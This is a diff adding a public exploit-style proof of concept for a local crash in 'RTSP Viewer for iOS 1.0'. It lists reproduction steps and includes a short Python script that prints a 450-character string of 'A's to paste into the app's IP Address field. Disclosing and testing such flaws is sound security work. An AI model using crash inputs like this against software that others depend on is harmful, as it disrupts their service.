@@ -1,0 +1,26 @@
+# Exploit Title: RTSP for iOS 1.0 - 'IP Address' Denial of Service (PoC)
+# Author: Luis Martinez
+# Discovery Date: 2020-08-03
+# Vendor Homepage: https://appadvice.com/app/rtsp-viewer/1056996189
+# Software Link: App Store for iOS devices
+# Tested Version: 1.0
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: iPhone 7 iOS 13.5.1
+
+# Steps to Produce the Crash:
+# 1.- Run python code: RTSP_Viewer_for_iOS_1.0.py
+# 2.- Copy content to clipboard
+# 3.- Open "RTSP Viewer for iOS"
+# 4.- Touch the screen
+# 5.- Clic add (+)
+# 6.- Name > "l4m5"
+# 7.- Paste ClipBoard on "IP Address"
+# 8.- Clic Back
+# 9.- Message save is successed > OK
+# 10.- Click created connection (AAAA...)
+# 11.- Crashed
+
+#!/usr/bin/env python
+
+buffer = "\x41" * 450
+print (buffer)
